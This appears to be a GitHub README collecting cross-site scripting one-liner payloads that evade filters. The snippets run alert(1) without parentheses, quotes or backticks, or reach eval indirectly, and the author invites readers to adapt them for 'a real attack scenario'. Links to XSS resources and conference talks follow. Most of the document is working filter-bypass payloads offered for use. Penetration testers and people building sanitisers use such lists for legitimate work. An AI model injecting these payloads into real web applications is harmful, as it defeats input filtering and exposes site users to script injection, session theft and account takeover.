# XSS oneliners payloads that rocks your nuts!

This was a list that I use often has a reference tool that I decided to publish. If you want to contribute your welcome, just tweet me at [@dsopas](https://twitter.com/dsopas) or something. Critics are always welcome!

BTW: the result is always to alert the number 1, if you want to do a real attack scenario just modify the vectors above.

## Without parentheses and quotes
```javascript
self[0X10f8809.toString`36`]`1`
```

PS: You can also use top instead of self to cut down 1 char.

Online: [https://jsfiddle.net/hx7kypv6/]() by [@aemkei](https://twitter.com/aemkei)

```javascript
x=alert,x`1`
```

Online: [https://jsfiddle.net/0bp4b2mf/]() - don't know really...

## Without quotes or backticks

```javascript
Object.bind(null,alert)()(1)
```

Online: [https://jsfiddle.net/w99tv481/]() by [@garethheyes](https://twitter.com/garethheyes)

## Eval without eval() and without quotes

```javascript
atob.constructor`alert\`1\````
```

Online: [https://jsfiddle.net/r4tdhs1L/]() by [@aemkei](https://twitter.com/aemkei)

## Other evading payloads

```javascript
Function('x=alert`1`','y')()
```

Online: [https://jsfiddle.net/qawpegx9/]() by [@garethheyes](https://twitter.com/garethheyes)

```javascript
/1/[Symbol.replace]('1',alert)
```

Online: [https://jsfiddle.net/7m9ex6L8/]() by [@garethheyes](https://twitter.com/garethheyes)

```javascript
Array.from([1],alert)
```

Online: [https://jsfiddle.net/ck5v3zgk/]() by [@garethheyes](https://twitter.com/garethheyes)

# Resources

* [XSSChallengeWiki](https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml)
* [JSFuck - Write any JavaScript with 6 Characters](https://github.com/aemkei/jsfuck)
* [HTML5 Security Cheatsheet](https://html5sec.org/)
* [XSS Polyglot Challenge](http://polyglot.innerht.ml/)
* [XSS Mindmap](https://github.com/jackmasa/XSS.png)


# Talks

* [AppSec EU 2017 Don't Trust The DOM: Bypassing XSS Mitigations Via Script Gadgets by Sebastian Lekies](https://www.youtube.com/watch?v=p07acPBi-qw)
* [AppSec EU15 - Gareth Heyes - XSS Horror Show](https://www.youtube.com/watch?v=yv5OtiIJwEE)
* [nullcon Goa 2015: ECMA Script 6 from an Attacker's Perspective by Mario Heiderich](https://www.youtube.com/watch?v=QnqFq-lcJ1I)